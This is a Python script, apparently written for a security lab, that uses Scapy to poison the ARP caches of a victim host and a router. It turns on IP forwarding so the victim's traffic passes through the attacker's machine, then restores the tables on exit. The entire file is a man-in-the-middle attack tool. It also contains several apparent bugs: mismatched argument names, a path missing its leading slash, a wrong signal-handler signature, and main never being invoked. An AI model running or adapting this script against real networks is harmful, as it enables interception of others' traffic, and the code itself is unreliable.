#!/usr/bin/env python

#ScapyArpPoison: python script to poison arp cache
#Programmer: Malcolm Jefferson
#sources: danmcinerney.org/arp-poisoning-with-python-2/, www.tabgen.com/blog/?p=13
#sources(cont): PythonScriptingwithScapyLab.pdf

#imports all methods from scapy library
from scapy.all import*
import argparse
import signal
import logging
import sys
# makes it so that the warning that there is no route found for the IPv6
#destination
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
#makes it non-verbose


#allow user to input information about packet
def parse_args(v,r):
	parser = argparse.ArgumentParser()
	parser.add_argument("-v","--VictimIP", help="Choose the victim IP address.")
	parser.add_argument("-r","--RouterIP", help= "Choose the router IP address")
	return parser.parse_args()
#automatically gathers the MAC addresses from local network machines when
#given IPs. Second line sends crafted ARP packet to IP address
#Sends out who-has ARP requests and waits for is-at replies from the machine that has the ip address
def MACgrab(ip):
	ans,unans = srp(ARP(pdst=ip),timeout=5, retry=3)
	for s,r in ans:
		return r.sprintf("%Ether.src%")
#sends spoofed packets to the router and victim. first line has the MAC source
#address attack the machine's because there is no hwsrc value. Tells the
#packet dest.IP that the router's MAC address who has the attacker's MAC address
# the second send does the same in reverse. now the packet will send
# all packets destined for the victim to the attacker.The victim will send
# all packets destined for the router to the attacker. 
def poison(routerIP, victimIP, routerMAC, victimMAC):
	send(ARP(op=1, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
	send(ARP(op=1, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
#Keeps a low profile and reverses what we did with the poisoning. Sending 
# packets to the victim and router updating ARP tables to store accurate
# information about which IP address is linked to which MAC address.
# hwdst ensures that the ARP replies are sent to everybody and their caches are restored
def restore(routerIP,victimIP,routerMAC,victimMAC):
	#hwdst will be the MAC of the router
	send(ARP(op=1, pdst=routerIP, psrc=victimIP, hwdst=routerMAC, hwsrc=victimMAC), count=50)
	#hwdst will be the MAC of the victim
	send(ARP(op=1, pdst=victimIP, psrc=routerIP, hwdst=victimMAC, hwsrc=routerMAC), count=50)
	sys.exit("out...")

#check to see if the usr is root
def main(args):
	if os.geteuid() != 0:
		sys.exit("Please run as root")
	#Run the IPs given through the MACgrab() function which will ask those
	#IP addresses for their MACs. will retry 3 times. if one or the other
	#do not respond with a "is-at" ARP packet then will exit
	routerIP = args.routerIP
	victimIP = args.victimIP
	routerMAC = MACgrab(args.routerIP)
	victimMAC = MACgrab(args.victimIP)
	if routerMAC == None:
		sys.exit("Could not find router MAC address. Closing...")
	if victimMAC == None:
		sys.exit("Could not find victim MAC address. Closing...")
	#will enable IP forwarding on attacking machine so it will forward
	#packets from victim to router and router to victim. 
	#write 1 for true in config file
	with open('proc/sys/net/ipv4/ip_forward','w') as ipf:
		ipf.write('1\n')
#works in the main function. catches ctrl-c's and performs action upon
#recieving it.
	def signal_handler(signal,frame,ipf):
		with open('proc/sys/net/ipv4/ip_forward','w') as ipf:
			ipf.write('0\n')
		restore(routerIP, victimIP, routerMAC, victimMAC)
	signal.signal(signal.SIGINT, signal_handler)
	#script enters infinite loop, sends 2 spoofed packets every 1.5 secs
	#one to vic. one to router. 
	while 1:
		poison(routerIP, victimIP, routerMAC, victimMAC)
		time.sleep(1.5)	
	main(parse_args())


